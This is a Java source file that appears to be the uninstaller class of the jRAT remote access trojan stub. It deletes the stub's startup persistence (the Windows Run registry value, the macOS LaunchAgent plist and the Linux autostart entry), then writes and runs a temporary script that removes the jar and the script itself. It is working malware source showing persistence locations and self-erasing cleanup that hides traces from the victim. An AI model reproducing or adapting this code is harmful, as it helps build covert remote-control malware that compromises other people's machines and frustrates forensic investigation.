package io.jrat.stub;

import io.jrat.common.utils.Utils;
import java.io.File;
import java.io.FileWriter;
import java.util.Random;
import oslib.OperatingSystem;
import oslib.Shell;

public class Uninstaller extends Thread {
	
	@Override
	public void run() {
		File me = io.jrat.stub.utils.Utils.getJarFile();
		
		if (!me.isFile()) {
			return;
		}

		try {
			String fileName = Integer.toString((new Random()).nextInt(10000));
			File file = null;
			String text = "";
			
			String home = System.getProperty("user.home");
			
			if (Utils.isRoot() && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
				home = "/System/";
			}

			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Configuration.getName());

				file = new File(fileName + ".bat");

				text += "pause & ";
				text += "del \"" + me.getAbsolutePath() + "\"" + " & ";
				text += "del %0";
			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
				File startupFile = new File(home + "/Library/LaunchAgents/" + Configuration.getName() + ".plist");
				startupFile.delete();

				file = new File(fileName + ".sh");

				text += "#!" + Shell.getShell().getPath() + "\n";
				text += "sleep 5\n";
				text += "rm " + me.getName() + "\n";
				text += "rm $0\n";
			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.LINUX) {
				File startupFile = new File(home + "/.config/autostart/" + Configuration.getName() + ".desktop");
				startupFile.delete();

				file = new File(fileName + ".sh");

				text += "#!" + Shell.getShell().getPath() + "\n";
				text += "sleep 5\n";
				text += "rm " + me.getName() + "\n";
				text += "rm $0\n";
			}

			if (file != null && text.length() > 0) {
				FileWriter writer = new FileWriter(file);
				writer.write(text);
				writer.close();

				if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
					Runtime.getRuntime().exec(new String[] { "cmd", "/c", file.getAbsolutePath() });
				} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS || OperatingSystem.getOperatingSystem().getType() == OperatingSystem.LINUX) {
					Runtime.getRuntime().exec(new String[] { Shell.getShell().getPath(), file.getName() });
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}

		System.exit(0);
	}

}
